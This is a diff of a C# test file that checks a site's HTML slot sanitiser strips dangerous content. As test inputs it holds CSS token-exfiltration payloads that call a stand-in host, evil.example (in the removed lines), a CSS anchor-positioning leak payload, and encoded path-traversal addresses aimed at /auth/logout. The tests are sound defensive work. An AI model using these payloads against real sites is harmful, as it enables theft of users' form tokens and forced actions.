@@ -20,7 +20,7 @@ public sealed class SlotsTests
     private const string Leo = "did:plc:leo4slots";
     private const string Path = F.AppearancePath;
 
-    private const string Head = "<meta name=\"theme-color\" content=\"#2f6f5e\">\n<link rel=\"icon\" href=\"/mark.png\">\n<style>\n.slot-masthead > a { color: var(--ts-accent); }\n</style>";
+    private const string Head = "<meta name=\"theme-color\" content=\"#2f6f5e\">\n<link rel=\"icon\" href=\"/media/mark.png\">";
     private const string Masthead = "<a href=\"https://sylin.org/\" class=\"brand\">Our site</a>";
     private const string DoorIntro = "<h2>Welcome</h2><p>Read <a href=\"/about\">about us</a>.</p>";
     private const string ArticleHeader = "<p>From the long reads.</p>";
@@ -157,36 +157,50 @@ public sealed class SlotsTests
         Assert.Equal("<meta name=\"keep-me\" content=\"yes\"><link rel=\"icon\" href=\"https://cdn.example/mark.png\">", head);
         Assert.Contains(head, HeadOf((await Send(visitor, HttpMethod.Get, "/")).Body));
 
-        // A style that could fetch, which could send a reader's token away from an attribute selector, is taken out whole; one
-        // that fetches nothing is kept as written.
-        foreach (var css in new[]
+        // No slot holds CSS, however harmless it reads: a selector and keywords alone can send a form's token away through a
+        // lazy image.
+        const string css = "<style>input[value^=a]~.post-form-actions button{anchor-name:--a}.leak-a{position-anchor:--a;position-area:bottom}</style>";
+        Assert.Equal(HttpStatusCode.OK, (await Json(leo, Path, Path, new { head = css, masthead = css, doorIntro = css, articleHeader = css, footer = css })).Status);
+        Assert.Equal(new Slots(), await Held());
+    }
+
+    [Fact]
+    public async Task An_image_or_an_icon_on_the_places_own_origin_stays_only_under_media()
+    {
+        await using var tangentSpace = await TangentSpaceFixture.StartAsync(Settings(), ct: Cancellation);
+        await Place(tangentSpace);
+        await Given.AParticipant(tangentSpace, Leo, [Roles.Administrator], ct: Cancellation);
+        using var leo = await SignedIn(tangentSpace, Leo);
+
+        foreach (var address in new[]
                  {
-                     "input[value^=a] { background: url(https://evil.example/a); }",
-                     "a { background: URL('https://evil.example/a'); }",
-                     "a { background: image-set(\"https://evil.example/a\" 1x); }",
-                     "a { background: -webkit-image-set(\"https://evil.example/a\" 1x); }",
-                     "a { background: \\75rl(https://evil.example/a); }",
-                     "html:has(input[value^=a]) img { display: block; }",
-                     "@import \"https://evil.example/s.css\"; a { color: red; }",
-                     "@IMPORT url(https://evil.example/s.css);",
-                     "@font-face { font-family: x; src: local(y); }",
-                     "@namespace svg \"http://www.w3.org/2000/svg\";",
-                     "a { color: red; } <!--"
+                     "/auth/logout", "/notifications", "/media", "/media/", "/mediafile", "/MEDIA/x.png", "auth/logout", "media/x.png", "./media/x.png", "//sylin.org/x.png",
+                     "/media/../auth/logout", "/media/%2e%2e/auth/logout", "/media/%2E%2E%2Fauth/logout", "/media%2f..%2fauth/logout", "/media/%252e%252e/auth/logout",
+                     "/media/..\\auth/logout", "/media/%5c..%5cauth/logout", "/media/./x.png", "/auth/logout?x=/media/y"
                  })
         {
-            Assert.Equal(HttpStatusCode.OK, (await Json(leo, Path, Path, new { head = "<style>" + css + "</style>" })).Status);
-            var kept = (await Held()).Head;
-            foreach (var gone in new[] { "evil.example", "script", "@", "url(" }) Assert.DoesNotContain(gone, kept, StringComparison.OrdinalIgnoreCase);
-            Assert.DoesNotContain("<style>", kept);
+            Assert.Equal(HttpStatusCode.OK, (await Json(leo, Path, Path, new
+            {
+                head = $"<link rel=\"icon\" href=\"{address}\"><link rel=\"apple-touch-icon\" href=\"{address}\">",
+                masthead = $"<img src=\"{address}\" alt=\"gone\">",
+                doorIntro = $"<p>words<img src=\"{address}\"></p>",
+                articleHeader = $"<img src=\"{address}\">",
+                footer = $"<img src=\"{address}\">"
+            })).Status);
+            var gone = await Held();
+            Assert.Equal(new Slots { DoorIntro = "<p>words</p>" }, gone);
         }
 
-        // An element that ends early ends there, and what follows it is what any other slot's script is.
-        Assert.Equal(HttpStatusCode.OK, (await Json(leo, Path, Path, new { head = "<style>a { color: red; } </style><script>alert(1)</script><style>" })).Status);
-        Assert.Equal("<style>\na { color: red; }\n</style>", (await Held()).Head);
-
-        const string quiet = "@media (min-width: 600px) { .masthead > a:not(.x) { color: color-mix(in srgb, var(--ts-accent), #fff 20%); } }";
-        Assert.Equal(HttpStatusCode.OK, (await Json(leo, Path, Path, new { head = "<style>" + quiet + "</style>" })).Status);
-        Assert.Equal("<style>\n" + quiet + "\n</style>", (await Held()).Head);
+        // Under /media/ it stays, as does one on another host, and rel="me" names a page no browser loads.
+        Assert.Equal(HttpStatusCode.OK, (await Json(leo, Path, Path, new
+        {
+            head = "<link rel=\"icon\" href=\"/media/mark.png?v=2\"><link rel=\"shortcut icon\" href=\"https://cdn.example/mark.png\"><link rel=\"me\" href=\"/p/ada\">",
+            footer = "<img src=\"/media/0123abcd\"><img src=\"https://cdn.example/x.png\">"
+        })).Status);
+        var kept = await Held();
+        Assert.Equal("<link rel=\"icon\" href=\"/media/mark.png?v=2\"><link rel=\"shortcut icon\" href=\"https://cdn.example/mark.png\"><link rel=\"me\" href=\"/p/ada\">", kept.Head);
+        Assert.Contains("src=\"/media/0123abcd\"", kept.Footer);
+        Assert.Contains("src=\"https://cdn.example/x.png\"", kept.Footer);
     }
 
     [Fact]
@@ -217,7 +231,7 @@ public sealed class SlotsTests
             Assert.Contains(over, form.Body);
         }
 
-        var head = "<style>" + new string('x', Slots.HeadLimit) + "{}</style>";
+        var head = "<meta name=\"long\" content=\"" + new string('x', Slots.HeadLimit) + "\">";
         var refused = await Json(leo, Path, Path, new { head });
         Assert.Equal(HttpStatusCode.BadRequest, refused.Status);
         Assert.Contains(Slots.HeadRule, refused.Body);
@@ -291,7 +305,7 @@ public sealed class SlotsTests
         Assert.Equal(HttpStatusCode.SeeOther, (await Form(leo, Path, Path, All())).Status);
 
         // A page standing alone names the place for what starts at its root, and is otherwise what the site says.
-        var rootedHead = Head.Replace("href=\"/mark.png\"", $"href=\"{BaseUrl}/mark.png\"");
+        var rootedHead = Head.Replace("href=\"/media/mark.png\"", $"href=\"{BaseUrl}/media/mark.png\"");
         void AssertAlone(string page, bool door, bool isArticle)
         {
             Assert.Contains(rootedHead, HeadOf(page));
